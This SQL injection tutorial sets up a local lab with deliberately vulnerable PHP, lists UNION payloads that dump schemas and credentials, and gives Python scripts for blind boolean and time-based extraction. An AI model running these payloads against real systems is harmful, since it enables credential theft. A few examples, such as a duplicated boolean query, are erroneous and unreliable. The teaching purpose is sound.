SQL Injection (SQLI) is an attack technique used to exploit vulnerabilities in web applications that do not properly validate user input in the SQL query sent to the database. Attackers can use this technique to execute malicious SQL queries and obtain sensitive information such as usernames, passwords and other information stored in the database.

SQL injections occur when attackers insert malicious SQL code into the input fields of a web application. If the application does not properly validate the user's input, the malicious SQL query will be executed in the database, allowing the attacker to obtain sensitive information or even control the database.

There are several types of SQL injections, including:
- **Error-based SQL injection**: This type of SQL injection exploits errors in the SQL code to obtain information. For example, if a query returns an error with a specific message, that message can be used to obtain additional information from the system.
- **Time-based SQL injection**: This type of SQL injection uses a query that takes a long time to execute to obtain information. For example, if you use a query that performs a lookup on a table and you add a delay in the query, you can use that delay to obtain additional information.
- **Boolean-based SQL injection**: This type of SQL injection uses queries with Boolean expressions to obtain additional information. For example, a query with a Boolean expression can be used to determine whether a user exists in a database.
- **Join-based SQL injection**: This type of SQL injection uses the "UNION" clause to combine two or more queries into one query. For example, if a query that returns information about users is used and a "UNION" clause is added with another query that returns information about permissions, additional information about user permissions can be obtained.
- **SQL injection based on stacked queries**: This type of SQL injection takes advantage of the possibility of executing multiple queries in a single statement to obtain additional information. For example, you can use a query that inserts a record into a table and then add an additional query that returns information about the table.

It should be noted that, in addition to the techniques mentioned above, there are many other types of SQL injections. However, these are some of the most popular and commonly used by attackers on vulnerable web pages.

It is also necessary to make a brief distinction between the different types of existing databases:
- **Relational databases**: SQL injections are most common in relational databases such as MySQL, SQL Server, Oracle, PostgreSQL, among others. In these databases, SQL queries are used to access data and perform database operations.
- **NoSQL databases**: Although SQL injections are less common in NoSQL databases, it is still possible to perform this type of attack. NoSQL databases, such as MongoDB or Cassandra, do not use the SQL language, but a different data model. However, it is possible to perform command injections in the queries performed on these databases. We will see this a few classes later.
- **Network databases**: Network databases, such as Neo4j, can also be vulnerable to SQL injections. In these databases, queries are used to access the nodes and relationships that have been stored in the database.
- **Object databases**: Object databases, such as db4o, can also be vulnerable to SQL injections. In these databases, queries are used to access objects that have been stored in the database.

It is important to understand the different types of SQL injections and how they can be used to obtain sensitive information and control a database. Developers must ensure that they properly validate user input and use defense techniques, such as input sanitization and SQL query preparation, to prevent SQL injections in their web applications.

----
> We can use this tool to practice SQL: [ExtendClass](https://extendsclass.com/mysql-online.html).
----
# Example

## Database creation

First of all, we are going to create a local database for testing. We are going to install some needed tools and start mysql and apache server:

```shell
sudo apt install mariadb-server apache2 php-mysql

service mysql start
service apache2 start
```

After the installation, we are going to enter into mysql service:

```shell
mysql -u root -p
```

We can do now the following stuff:

```mysql
# We create the database
create database SampleDB;

# Check existing databases
show databases;

# Enter in the specified database
use SampleDB;

# Show existing tables in the database
show tables;

# Create the table 'users' with data structure
create table users(id int(32), username varchar(32), password varchar(32));

# Check the table data structure
describe users;

# Create new column with desired data into the table 'users'
insert into users(id, username, password) values(1, 'admin', 'admin123$!p@$$');

# View all data from table users
select * from users;

# Create new user able to connect to the database externally and give him privileges
create user 'loki'@'localhost' identified by 'loki123';
grant all privileges on SampleDB.* to 'loki'@'localhost';
```

## SQL Injection

We are going to create the following .php script inside the */var/www/html* folder:

```php
<?php

	$server = "localhost";
	$username = "loki";
	$password = "loki123";
	$database = "SampleDB";

	# Connection to the database
	$conn = new mysqli($server, $username, $password, $database);

	$id = $_GET['id'];

	$data = mysqli_query($conn, "select username from users where id = '$id'") or die(mysqli_error($conn));

	$response = mysqli_fetch_array($data);

	echo $response['username'];
	
?>
```

With this script we can obtain the username corresponding to the queried id:

```php
http://localhost/searchUsers.php?id=1
```

Now, we can start the injections. First of all, we can check if the server returns an error when we try to insert a ' after the id:

```php
http://localhost/searchUsers.php?id=1'
```

If prints an error message we can try to inject some payloads.

First, we will use *union select* for inserting a new line that includes '0' in the example below inside into a existing column:

```php
http://localhost/searchUsers.php?id=123456' union select 0-- -
```

In previous example there is only one column, but in the case that there were more columns (for example 3) we need to use the *union select* like this:

```php
http://localhost/searchUsers.php?id=123456' union select 0,0,0-- -
```

In pevious examples we are not using an existing id, this is important because we need to use a *non existing id*  for viewing the information that we have introduced, in this case, '0'. This is the first step, now we can try the following stuff:

```php
# This will give us the database in use name
http://localhost/searchUsers.php?id=123456' union select database()-- -

# This will give us all existing databases
http://localhost/searchUsers.php?id=123456' schema_name from information_schema.schemata-- -

# The previous statement will not always return us the information, in that case we need to limit it
http://localhost/searchUsers.php?id=123456' union select schema_name from information_schema.schemata limit 0,1-- - # Limited to one result, getting the first value
http://localhost/searchUsers.php?id=123456' union select schema_name from information_schema.schemata limit 1,1-- - # Limited to one result, getting the second value
http://localhost/searchUsers.php?id=123456' union select schema_name from information_schema.schemata limit 2,1-- - # Limited to one result, getting the third value

# The best and easiest way to do that is concatenating the result separated by commas
http://localhost/searchUsers.php?id=123456' union select group_concat(schema_name) from information_schema.schemata # This will return something like 'database1,database2,database3...'

# For obtaining what tables are included inside a provided database
http://localhost/searchUsers.php?id=123456' union select group_concat(table_name) from information_schema.tables where table_schema='SampleDB'-- -

# For obtaining what columns are included inside a provided table
http://localhost/searchUsers.php?id=123456' union select group_concat(column_name) from information_schema.columns where table_schema='SampleDB' and table_name='users'-- -

# If we are inside the wanted database (check with database()) we can obtain the values inside the columns
http://localhost/searchUsers.php?id=123456' union select group_concat(username) from users-- -
http://localhost/searchUsers.php?id=123456' union select group_concat(password) from users-- -
http://localhost/searchUsers.php?id=123456' union select group_concat(username,':',password) from users-- - # Here we concatenate two columns
http://localhost/searchUsers.php?id=123456' union select group_concat(username,0x3a,password) from users-- - # Here we concatenate two columns, but using hexa value for ':' for avoiding errors with quotes

# Just in case we are not inside the wanted database, we need to specify what database we want to read
http://localhost/searchUsers.php?id=123456' union select group_concat(username) from SampleDB.users-- -
```

If we don't get any error by console, we can anyway keep trying looking at web changes.

This new .php file will have the quote sanitized:

```php
<?php

	$server = "localhost";
	$username = "loki";
	$password = "loki123";
	$database = "SampleDB";

	# Connection to the database
	$conn = new mysqli($server, $username, $password, $database);

	# Sanitized quote
	$id = mysqli_real_escape_string($conn, $_GET['id']);

	$data = mysqli_query($conn, "select username from users where id = $id");

	$response = mysqli_fetch_array($data);

    if(! isset($response['username'])){
      http_response_code(404);
    }
	
?>
```

In that script the only change will be the response code, it will be 200 if username exists and if not, 404. Notice that the quotation marks around the id in the query have disappeared, it may be useful for making SQL injections without the need of inserting a quotation mark in the url query.

----
> Therefore, not all SQL injection starts with a quotation mark and not all SQL injection needs ending comments
----

If we want to try a blind SQL injection, we can get the response headers to check if there are changes in requests:

```shell
# With the last .php script this will return us the status code 404, because that user does not exist in database
curl -s -I -X GET "http://localhost/searchusers.php?id=8"

# With the last .php script this will return us the status code 200, because that user exists in database
curl -s -I -X GET "http://localhost/searchusers.php?id=1"
```

When we want to try blind queries, we may try with *Boolean-based blind SQL Injection*:

```mysql
# In this case, the first username is 'admin'. The first letter of 'admin' is 'a', so this query will return us '1' (true)
select(select substring(username,1,1) from users where id = 1) = 'a';

# In this case, the first username is 'admin'. The first letter of 'admin' is 'a', so this query will return us '0' (false)
select(select substring(username,1,1) from users where id = 1) = 'a';

# Quotation marks will give us error in SQL, so we need to convert it to ascii code ('a' is 97). Below code will work and will return us '1' (true)
select(select ascii(substring(username,1,1)) from users where id = 1) = 97;
```

We can do a Python script for applying brute-force with *Boolean-based blind SQL Injection*, replacing the substring start position and the letter to compare:

```python
#!/usr/bin/python3

import requests
import signal
import sys
import time
import string
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLI():
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Datos extraidos")

    extracted_info = ""

    for position in range(1, 50):
        for character in range(33, 126):
	        # We will do this with a non existing id, in this case '9'
            sqli_url = main_url + "?id=9 or (select(select ascii(substring(username,%d,1)) from users where id = 1)=%d)" % (position, character)

			# We can get more complex results. In this case we will retrieve all username:password in users
			# sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id = 1)=%d)" % (position, character)
					
			# In this case we will retrieve all username:password in users
			# sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id = 1)=%d)" % (position, character)

            p1.status(sqli_url)

            r = requests.get(sqli_url)

            if r.status_code == 200:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break

if __name__ == '__main__':
    makeSQLI()

```

We can test *Time-based blind SQL Injection* too. In this type of injections, we can know if the character is valid or not depending on the response time. Look at the example below:

```python
#!/usr/bin/python3

import requests
import signal
import sys
import time
import string
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)
  
signal.signal(signal.SIGINT, def_handler)
  
main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLI():
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")
    time.sleep(2)  

    p2 = log.progress("Datos extraidos")
  
    extracted_info = ""
  
    for position in range(1, 50):
        for character in range(33, 126):
            # We will do this with an existing id, in this case '1', the we will delay 0.35 seconds
            sqli_url = main_url + "?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users),%d,1))=%d,sleep(0.35),1)" % (position, character)

            # We can get more complex results. In this case we will retrieve all username:password in users
            # sqli_url = main_url + "?id=1 and if(ascii(substr(database(),%d,1))=%d,sleep(0.35),1)" % (position, character)

            p1.status(sqli_url)
  
            # Init chrono
            time_start = time.time()
  
            r = requests.get(sqli_url)

            # End chrono
            time_end = time.time()

            if time_end - time_start > 0.35:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break

if __name__ == '__main__':
    makeSQLI()
```